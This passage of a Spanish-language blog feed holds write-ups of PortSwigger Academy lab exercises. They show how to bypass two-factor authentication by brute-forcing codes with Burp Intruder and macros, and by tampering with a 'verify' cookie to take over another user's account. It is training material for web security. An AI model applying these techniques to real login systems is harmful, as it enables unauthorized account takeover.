			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/resuelto_hu240511762ddbf484074345bc015acedf_85847_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-10/resuelto_hu240511762ddbf484074345bc015acedf_85847_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Authentication Lab 9</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/</link>
        <pubDate>Wed, 24 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/head.png" alt="Featured image of post Portswigger Academy Learning Path: Authentication Lab 9" /&gt;&lt;h1 id=&#34;lab-2fa-bypass-using-a-brute-force-attack&#34;&gt;Lab: 2FA bypass using a brute-force attack&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es hacer un bypass al segundo factor de autenticacion, se nos da unas credenciales que son &lt;code&gt;carlos:montoya&lt;/code&gt; y luego de esto se nos pide el segundo factor de autenticacion y la idea es saltarselo para poder ingresar.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Al iniciar sesion con las credenciales, se puede notar que se pide el 2FA si las credenciales son correctas. Pero este hace uso de &lt;code&gt;csrf-token&lt;/code&gt; y como todo token va cambiando y enviandose por lo que si usamos algo como repeater el codigo ya no funcionara mas.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 154; 
			flex-basis: 369px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/csrftoken.png&#34; data-size=&#34;784x509&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/csrftoken.png&#34;
			width=&#34;784&#34;
			height=&#34;509&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/csrftoken_hu7af8705dd3be90ab7a17c861d19ef02c_69815_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/csrftoken_hu7af8705dd3be90ab7a17c861d19ef02c_69815_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Token CSRF enviado en peticion&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Token CSRF enviado en peticion&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;El proceso de iniciio de sesion es el siguiente, luego de iniciar credenciales por lo que pide el codigo 2FA.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 370; 
			flex-basis: 890px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/login.png&#34; data-size=&#34;1124x303&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/login.png&#34;
			width=&#34;1124&#34;
			height=&#34;303&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/login_hu7a9673f81c06cd1bd3915f72c75f992f_15696_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/login_hu7a9673f81c06cd1bd3915f72c75f992f_15696_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;2FA en el inicio de sesion&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;2FA en el inicio de sesion&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Pero notamos que al intentar mas de 2 codigos de 2FA el sistema vuelve a pedir las credenciales nuevamente.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 200; 
			flex-basis: 482px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/login2.png&#34; data-size=&#34;1143x569&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/login2.png&#34;
			width=&#34;1143&#34;
			height=&#34;569&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/login2_hu0cee997e40631e6ba28cbe37b43eb83e_25513_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/login2_hu0cee997e40631e6ba28cbe37b43eb83e_25513_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Inicio de sesion continuo al 2 intentos erroneos&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Inicio de sesion continuo al 2 intentos erroneos&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y si vamos a la pestana de email client recibimos el codigo de seguridad.&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Ya que se cuenta con un token csrf nos complica y que tambien despues de dos intentos se nos vuelven a pedir credenciales, por lo que automatizar el ataque se nos complica. Pero burpsuite cuenta con el uso de macros lo que nos permitira automatizar todo el proceso. Para eso se sigue el siguiente proceso:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 237; 
			flex-basis: 569px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/sessions.png&#34; data-size=&#34;995x419&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/sessions.png&#34;
			width=&#34;995&#34;
			height=&#34;419&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/sessions_hub5141f68eb7917e8708e0fa5db34d275_23701_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/sessions_hub5141f68eb7917e8708e0fa5db34d275_23701_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Paso 1&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Paso 1&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 189; 
			flex-basis: 453px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/scope.png&#34; data-size=&#34;1148x607&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/scope.png&#34;
			width=&#34;1148&#34;
			height=&#34;607&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/scope_hub3892af7d3cd674809d1116addd0048e_47279_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/scope_hub3892af7d3cd674809d1116addd0048e_47279_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Paso 2&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Paso 2&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 120; 
			flex-basis: 288px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/macrorecorder.png&#34; data-size=&#34;1023x851&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/macrorecorder.png&#34;
			width=&#34;1023&#34;
			height=&#34;851&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/macrorecorder_hu1b20d870f6e284add3ceef33157064b8_87107_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/macrorecorder_hu1b20d870f6e284add3ceef33157064b8_87107_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Paso 3&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Paso 3&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 205; 
			flex-basis: 493px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/macro.png&#34; data-size=&#34;1940x943&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/macro.png&#34;
			width=&#34;1940&#34;
			height=&#34;943&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/macro_hu7e1c2a19d4debc819f7d6457ec211d08_75913_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/macro_hu7e1c2a19d4debc819f7d6457ec211d08_75913_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Paso 4&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Paso 4&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Los pasos anteriores lo que hace, es crear una macro de todos los pasos que hace nuestra consulta para antes de poder enviar el codigo, toda esta macro nos realizara el proceso para poder aplicar fuerza bruta en el 2FA y resolverlo. Algo a recordar es siempre dar &lt;code&gt;test macro&lt;/code&gt; para poder validad que la macro funcione correctamente.&lt;/p&gt;
&lt;p&gt;Despues de todo este proceso ya podemos realizar el ataque con intruder ya que la macro anteriormente definida, para eso enviamos la peticion donde es enviada el codigo 2FA a intruder.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 216; 
			flex-basis: 519px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/intruder.png&#34; data-size=&#34;1295x598&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/intruder.png&#34;
			width=&#34;1295&#34;
			height=&#34;598&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/intruder_hu75c91db759eaae54cee2a8cdd1d1a3ce_77267_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/intruder_hu75c91db759eaae54cee2a8cdd1d1a3ce_77267_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder 2FA&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder 2FA&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Seteamos valores de 0001 hasta 9999, diciendo que tenga el tamano de 4 y sin decimales&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 103; 
			flex-basis: 247px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/payloads.png&#34; data-size=&#34;721x698&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/payloads.png&#34;
			width=&#34;721&#34;
			height=&#34;698&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/payloads_hue717eca9a6189da33017306a26d2c17f_24430_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/payloads_hue717eca9a6189da33017306a26d2c17f_24430_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Payloadas 2FA&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Payloadas 2FA&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Seteamos tambien que solo se envie una peticion y no se maneje por hilos ya que al ser token csrf no funcionaria el envio de demasiadas peticiones&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 144; 
			flex-basis: 346px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/resourcepool.png&#34; data-size=&#34;990x686&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/resourcepool.png&#34;
			width=&#34;990&#34;
			height=&#34;686&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/resourcepool_hu23c7c0b0b3599353fb736478a10a5d88_22890_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/resourcepool_hu23c7c0b0b3599353fb736478a10a5d88_22890_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Resource Pool 2FA&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Resource Pool 2FA&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora lanzamos el ataque y esperar, se nos muestra una respuesta con codigo 302 que es la correcta. Asi que damos show response in browser, lo pegamos en el link y con eso ya tenemos acceso a la cuenta de carlos.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 153; 
			flex-basis: 369px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/resultado.png&#34; data-size=&#34;791x514&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/resultado.png&#34;
			width=&#34;791&#34;
			height=&#34;514&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/resultado_hu6ffc76c2141cf0f3f78d5bbff4222d64_34089_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/resultado_hu6ffc76c2141cf0f3f78d5bbff4222d64_34089_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Respuestas del servidor&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Respuestas del servidor&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al pegar esta direccion en el navegador ya nos redirige al perfil de &lt;code&gt;carlos&lt;/code&gt; y hemos resuelto el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 193; 
			flex-basis: 463px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/resuelto.png&#34; data-size=&#34;1780x922&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/resuelto.png&#34;
			width=&#34;1780&#34;
			height=&#34;922&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/resuelto_hu73e65476ac7e3458103efdbf6e68cd75_103759_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-9/resuelto_hu73e65476ac7e3458103efdbf6e68cd75_103759_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Authentication Lab 8</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/</link>
        <pubDate>Mon, 22 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/head.png" alt="Featured image of post Portswigger Academy Learning Path: Authentication Lab 8" /&gt;&lt;h1 id=&#34;lab-2fa-broken-logic&#34;&gt;Lab: 2FA broken logic&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es hacer un bypass al segundo factor de autenticacion, se nos da un email de cliente en el cual recibiremos el codigo y se nos da los usuarios &lt;code&gt;wiener&lt;/code&gt; y &lt;code&gt;carlos&lt;/code&gt; basandonos en estos haremos posible hacer el bypass para el usuario carlos.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;En el email de &lt;code&gt;wiener&lt;/code&gt; sera en el que recibiremos el correo con el codigo de seguridad al intentar iniciar con la contrasena &lt;code&gt;peter&lt;/code&gt;. Al iniciar sesion con las credenciales, luego se nos pide el codigo de seguridad.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 276; 
			flex-basis: 664px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/login.png&#34; data-size=&#34;1135x410&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/login.png&#34;
			width=&#34;1135&#34;
			height=&#34;410&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/login_hu4839c5983dd8a0eafcf987690819c5a7_18007_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/login_hu4839c5983dd8a0eafcf987690819c5a7_18007_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Intruder inicio de sesion&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Intruder inicio de sesion&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y si vamos a la pestana de email client recibimos el codigo de seguridad.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 219; 
			flex-basis: 526px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/email.png&#34; data-size=&#34;1787x815&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/email.png&#34;
			width=&#34;1787&#34;
			height=&#34;815&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/email_huf1e4820a0b41ae8d74a7f497031a2de2_138815_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/email_huf1e4820a0b41ae8d74a7f497031a2de2_138815_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Codigo de seguridad para usuario wiener&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Codigo de seguridad para usuario wiener&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;En este caso ya que no contamos con la contrasena del usuario carlos haremos un account takeover y tambien pasando una configuracion de seguridad incorrecta en el 2FA que permite enviar multiples codigos de seguridad sin bloquearnos.&lt;/p&gt;
&lt;p&gt;Notamos que al iniciar con credenciales correctas de &lt;code&gt;wiener:peter&lt;/code&gt; el sistema envia una cookie llamada &lt;code&gt;verify=wiener&lt;/code&gt; lo que nos da a entender que esta validando al usuario &lt;code&gt;wiener&lt;/code&gt; su segundo factor de autenticacion, y si es correcto lo redirigira con una cookie asignada a su perfil.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 153; 
			flex-basis: 368px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/cookie.png&#34; data-size=&#34;788x513&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/cookie.png&#34;
			width=&#34;788&#34;
			height=&#34;513&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/cookie_hu07864f4c60f045ea92fe51a4f6a17ae4_67443_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/cookie_hu07864f4c60f045ea92fe51a4f6a17ae4_67443_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Cookie del usuario wiener&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Cookie del usuario wiener&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Si enviamos nuestro codigo que hemos recibido en el correo, ingresa automaticamente al perfil de wiener, y es aca donde esta la vulnerabilidad, ya que tenemos una cookie pero que aun no tiene asignado un perfil podremos utilizarla para acceder con el usuario &lt;code&gt;carlos&lt;/code&gt; y con intruder generar un ataque de &lt;code&gt;sniper&lt;/code&gt; el cual inyecte numeros del 1111 al 1999 hasta que encontremos el codigo que sea el correcto. En este caso vamos a repetir el proceso pero lo vamos a interceptar y al momento que se llegue a esta peticion lo enviaremos al intruder y le damos drop para que la cookie la podamos utilizar en intruder.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 238; 
			flex-basis: 572px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/intruder1.png&#34; data-size=&#34;1226x514&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/intruder1.png&#34;
			width=&#34;1226&#34;
			height=&#34;514&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/intruder1_hu4e55fc44083498c44d71911d6f1e441d_71983_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/intruder1_hu4e55fc44083498c44d71911d6f1e441d_71983_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Configuracion de posicion de payloads&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Configuracion de posicion de payloads&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 142; 
			flex-basis: 342px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/intruder2.png&#34; data-size=&#34;616x432&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/intruder2.png&#34;
			width=&#34;616&#34;
			height=&#34;432&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/intruder2_hu5e4a329dcb8a896f6f1c57ce6298e69a_13486_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/intruder2_hu5e4a329dcb8a896f6f1c57ce6298e69a_13486_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Configuracion de payload set con valores de 1111 a 9999&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Configuracion de payload set con valores de 1111 a 9999&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ya que tenemos los resultados, notamos que existe una respuesta &lt;code&gt;302&lt;/code&gt; que es la que nos redirige a nuestro perfil. Asi que ya tenemos una cookie valida para poder ingresar al perfil de carlos.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 172; 
			flex-basis: 414px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/resultado.png&#34; data-size=&#34;781x452&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/resultado.png&#34;
			width=&#34;781&#34;
			height=&#34;452&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/resultado_hu8a62f2d8a30043e4754a1e51d85dc647_28052_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/resultado_hu8a62f2d8a30043e4754a1e51d85dc647_28052_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Resultado de intruder&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Resultado de intruder&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Luego de esto burpsuite cuenta con una funcion interesante que es ver la respuesta en el navegador dando clic derecho y &lt;code&gt;Show response in browser&lt;/code&gt; por lo que copiamos el link y lo pegamos en el navegador&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 199; 
			flex-basis: 479px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/responseinbrowser.png&#34; data-size=&#34;1284x643&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/responseinbrowser.png&#34;
			width=&#34;1284&#34;
			height=&#34;643&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/responseinbrowser_hud851cd82faf8e79376d822c4949490b6_44264_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/responseinbrowser_hud851cd82faf8e79376d822c4949490b6_44264_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ver respuesta de burpsuite en navegador&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ver respuesta de burpsuite en navegador&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al pegar esta direccion en el navegador ya nos redirige al perfil de &lt;code&gt;carlos&lt;/code&gt; y hemos resuelto el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 190; 
			flex-basis: 457px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/resuelto.png&#34; data-size=&#34;1802x946&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-authentication-lab-8/resuelto.png&#34;
			width=&#34;1802&#34;
			height=&#34;946&#34;
